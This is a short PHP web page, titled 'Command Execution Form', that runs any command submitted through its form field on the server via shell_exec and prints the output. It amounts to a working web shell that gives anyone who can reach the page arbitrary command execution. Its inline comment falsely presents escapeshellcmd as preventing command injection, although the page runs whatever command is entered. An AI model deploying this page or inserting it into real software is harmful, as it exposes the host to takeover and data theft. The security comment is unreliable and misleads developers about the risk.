<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution</title>
</head>
<body>
    <h1>Command Execution Form</h1>
    <form method="POST">
        <label for="cmd">Enter Command:</label>
        <input type="text" id="cmd" name="cmd" required>
        <button type="submit">Execute</button>
    </form>

    <h2>Result:</h2>
    <pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = escapeshellcmd($_POST['cmd']); // Sanitize the input to prevent command injection
    echo htmlspecialchars(shell_exec($cmd)); // Execute the command and display the result
}
?>
    </pre>
</body>
</html>
